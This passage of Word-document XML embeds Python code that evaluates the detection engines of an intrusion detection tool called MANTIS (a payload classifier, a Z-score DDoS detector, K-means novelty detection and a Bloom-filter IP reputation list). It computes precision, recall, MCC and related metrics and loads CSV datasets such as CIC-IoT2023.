          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63D4322A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E9551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evaluate_payload(rows, brain):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215BA0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 = nb_engine.PayloadMonitor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53161B5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"payload" in brain:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="122364F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eng.import_brain(brain["payload"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E556C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yt, yp = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63401F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payload, label in rows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E02D63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 _, _ = eng.classify(payload.encode("utf-8", errors="ignore"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE1D8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yt.append("Malicious" if label in {"Malicious", "Attack"} else "Safe")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C2C0D2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yp.append(verdict)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610245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cm = confusion(yt, yp, "Malicious")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F3F63A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{"engine": "Naive Bayes (Payload)", "samples": len(rows),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DDE461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"confusion_matrix": cm, **scores(cm)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="433302EC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1703DE2B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A6EE79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evaluate_zscore(series, threshold=3.0, window=30, guard_baseline=True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BB69E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"""Evaluate the volumetric engine through its uniform analyse() interface.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07EFA6F5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0FE4C82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`guard_baseline=False` reproduces the naive estimator, which lets the two</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56DEDD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variants be reported side by side (see --compare). The difference is large:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EDDA7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without the guard a sustained flood is absorbed into the rolling baseline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5873686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within `window` seconds and recall collapses.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E783C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5ABB2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 = zscore_engine.MinimalistStats(window_size=window,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66E4DC8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threshold=threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74ED716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guard_baseline=guard_baseline)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54252D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yt, yp = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="315060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pps, label in series:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7383609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 = eng.analyse(pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="121C91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yp.append("DDoS" if verdict.is_threat else "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D044B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yt.append("DDoS" if label in {"DDoS", "Attack", "Malicious"} else "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58DC06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cm = confusion(yt, yp, "DDoS")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE5FA5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name = "Z-Score (DDoS)" if guard_baseline else "Z-Score (DDoS, naive baseline)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C197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{"engine": name, "samples": len(series),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DCE7C7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"threshold": threshold, "window": window,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2589A7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"guard_baseline": guard_baseline,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF1F4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"confusion_matrix": cm, **scores(cm)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59459653" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DA4CE6F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="169061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evaluate_kmeans(series, brain, k=3, alpha=0.05, radius_multiplier=3.0):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C05ABE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"""Evaluate the clustering engine as a novelty detector.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40A08500" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="691B20C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The engine decides on distance from learned centroids rather than cluster</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C61D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identity, producing a binary verdict that can be scored like the others.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B577D5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6700E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 = kmeans_engine.KMeansMonitor(k=k, learning_rate=alpha,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53EE0D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radius_multiplier=radius_multiplier)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E937C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"kmeans" in brain:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1F52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eng.import_brain(brain["kmeans"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BAE866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yt, yp = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2167B49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pps, ports, label in series:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="228849F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 = eng.analyse(pps, ports)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="618B6B2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yp.append("Anomaly" if verdict.is_threat else "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9A241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yt.append("Anomaly" if label in {"Anomaly", "Attack", "Malicious",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="006647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"DDoS", "Scan"} else "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ECF746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cm = confusion(yt, yp, "Anomaly")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B219D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{"engine": "K-Means (Novelty)", "samples": len(series),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769553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"radius_multiplier": radius_multiplier,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A5910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"confusion_matrix": cm, **scores(cm)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FBADBDE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E91B14E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="364BFF7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evaluate_bloom(rows, size=1000, hashes=3, train_split=0.5):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C9525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"""Evaluate the reputation filter, and measure its false-positive rate.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20CD2141" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78818E7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Bloom filters cannot produce false negatives, so recall on the indicators</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D43022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actually loaded is 1.0 by construction. The figure worth reporting is the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EB6A8D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empirical false-positive rate on addresses that were never inserted, which</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3078716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is what the bit-array sizing trades against memory. Both are reported here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17A2B3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7D34C4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malicious = [ip for ip, label in rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602269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label in {"Malicious", "Attack", "Blacklisted"}]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2347A2E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benign = [ip for ip, label in rows if ip not in set(malicious)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E40B1DD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62F425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split = max(1, int(len(malicious) * train_split))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4145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loaded, held_out = malicious[:split], malicious[split:]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2214D3B0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1409CEA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 = bloom_engine.BloomFilter(size=size, hash_count=hashes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5749634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ip in loaded:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3571DA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eng.add(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BDB466A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56294AD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yt, yp = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0929F1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ip in loaded:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2933E6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yt.append("Blacklisted")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4711F9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yp.append("Blacklisted" if eng.check(ip) else "Unknown")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17931E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ip in benign:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="020DCA2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yt.append("Unknown")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="661180E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yp.append("Blacklisted" if eng.check(ip) else "Unknown")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488A067D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7227D6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cm = confusion(yt, yp, "Blacklisted")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D5FDE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result = {"engine": "Bloom Filter (Reputation)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E9D1E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"samples": len(loaded) + len(benign),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6226E03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"indicators_loaded": len(loaded),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0875630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"bit_array_size": size, "hash_count": hashes,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A648F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"saturation": round(eng.saturation(), 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ECF11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"theoretical_fp_rate": round(eng.false_positive_rate(), 6),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E10F3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"confusion_matrix": cm, **scores(cm)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D106A6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held_out:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39CF7DB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indicators never inserted must not be recognised</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6817809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leaked = sum(1 for ip in held_out if eng.check(ip))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AD25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result["held_out_indicators"] = len(held_out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="557B06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result["held_out_false_hits"] = leaked</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BC3BE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result</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F71243F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4288719C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="077B36A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print_report(results):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CEC7B5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 = ["",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3745585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A5A7B8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MANTIS Evaluation Report",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C421B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F2A8F7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 time.strftime("%Y-%m-%d %H:%M:%S"), ""]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ECF51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r in results:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2267301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cm = r["confusion_matrix"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BAD57B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 += [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="740C0F5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 ---" % r["engine"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DB5EF4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Samples         : %d" % r["samples"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17AA1D5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True  Positives : %d" % cm["tp"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7434473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False Positives : %d" % cm["fp"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="149C835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False Negatives : %d" % cm["fn"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="536848C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True  Negatives : %d" % cm["tn"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62BD94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Precision       : %.4f" % r["precision"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E0701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Recall          : %.4f" % r["recall"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC87E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Specificity     : %.4f" % r.get("specificity", 0.0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA009F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F1              : %.4f" % r["f1"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19ABCCE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Accuracy        : %.4f" % r["accuracy"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EDFC6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Balanced Acc.   : %.4f" % r.get("balanced_accuracy", 0.0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D8AC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MCC             : %.4f" % r.get("mcc", 0.0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287115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Prevalence      : %.4f (positive-class share of this data)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1552435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r.get("prevalence", 0.0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FEF104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No-skill F1     : %.4f (majority-positive guesser scores this)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6150C7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r.get("no_skill_f1", 0.0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73151E5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C3992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r["f1"] &lt;= r.get("no_skill_f1", 0.0):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B6EB0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L.append("  [!] F1 does NOT beat the no-skill baseline on this "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F636F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"data - read MCC / balanced accuracy instead.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B069F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L.append("")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EDE99B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cross-engine summary so all engines appear in one comparable table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBB47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len(results) &gt; 1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C0A90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 += ["--- Summary ---",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3522214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%-34s %9s %8s %8s %8s %8s" % ("Engine", "Precision",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79646F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"Recall", "F1", "Bal.Acc",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0AC4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"MCC"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="411D8B5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 "-" * 78]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="257786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r in results:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="756963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L.append("  %-34s %9.4f %8.4f %8.4f %8.4f %8.4f"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670D24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(r["engine"][:34], r["precision"], r["recall"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E2B48F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r["f1"], r.get("balanced_accuracy", 0.0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D9A85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r.get("mcc", 0.0)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0100E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L.append("")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D8B8F1B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DFDD0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L.append("================================================================")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3C77A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text = "\n".join(L)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73C85CC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print(text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="689CF1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text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67E3CB41" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28F97A58" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05D753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parse_args(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B933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 = argparse.ArgumentParser(prog="mantis-eval",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BFC9CF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description="evaluate mantis engines")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351F892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p.add_argument("--knn-csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15DD5E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p.add_argument("--payload-csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6882438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p.add_argument("--zscore-csv", help="csv with pps,label")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68669F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p.add_argument("--cic-zscore-csv",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F1FC8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help="CIC-IoT2023 export; evaluates the volumetric engine "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3572030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"on its Rate/Label columns")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71EB665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p.add_argument("--cic-limit", type=int,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC295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help="cap rows read from --cic-zscore-csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39DE59B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p.add_argument("--cic-benign-ratio", type=float,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22248A8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help="also evaluate --cic-zscore-csv resampled to this "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EE387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"benign prevalence (e.g. 0.95), testing whether the "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29CF62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"recall collapse is caused by class imbalance")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="140C26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p.add_argument("--kmeans-csv", help="csv with pps,ports,label")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="313B87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p.add_argument("--bloom-csv", help="csv with ip,label")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D7D6C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p.add_argument("--brain",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5700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help="brain json to evaluate against, or 'auto' for the "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C8C1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"newest in data/ (default: seeded engines)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EBCD33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p.add_argument("--out-json", default="evaluation_results.json")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CFEB16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p.add_argument("--out-txt", default="evaluation_results.txt")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E7A10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p.add_argument("--zscore-threshold", type=float, default=3.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E18FAE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p.add_argument("--zscore-window", type=int, default=30)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5F6C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p.add_argument("--compare", action="store_true",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD7331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help="also evaluate the naive Z-Score baseline for "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD06B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"side-by-side comparison")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62C26F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p.parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583D72AC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48650826" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66F6879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load_zscore_csv(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ABBF03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series = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36FB315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open(path, "r", newline="", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA0BBC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 = csv.DictReader(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A4FE38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 = {c.lower().strip(): c for c in (r.fieldnames or [])}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D9B5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"pps" not in h or "label" not in h:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C230C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raise loader.DatasetError(path + ": need pps,label cols")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17A1427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row in r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20807D9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series.append((int(float(row[h["pps"]])), row[h["label"]]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5DFA7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series</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C5DA7EE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70001812" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4EA856B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load_cic_zscore_csv(path, limit=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B144F3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"""Derive a packets-per-second series from a CIC-IoT2023 flow export.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4530313F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64DE1B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The benchmark ships one row per flow with a `Rate` column (packets per</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37C5464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second observed for that flow) and a `Label` naming the attack class.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="262686E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Feeding `Rate` to the volumetric engine permits comparison across exports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F116B9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that use the same schema and row ordering.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A583686" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="353089E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One caveat is worth stating plainly, because it bounds what the resulting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="222700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metrics mean: flow records are not a true temporal series. Row order is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D4B982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the order of the export, not wall-clock arrival order, so the engine sees</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6817EB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 sequence of rate observations rather than genuine per-second traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A3185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This approximation is useful only for like-for-like comparisons where both</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23EA92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variants see identical input in identical order. It is not a substitute for</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78FF8BE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live capture or PCAP replay, where ordering is real.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA6FAE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6F35B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series = []</w:t>
      </w:r>
    </w:p>
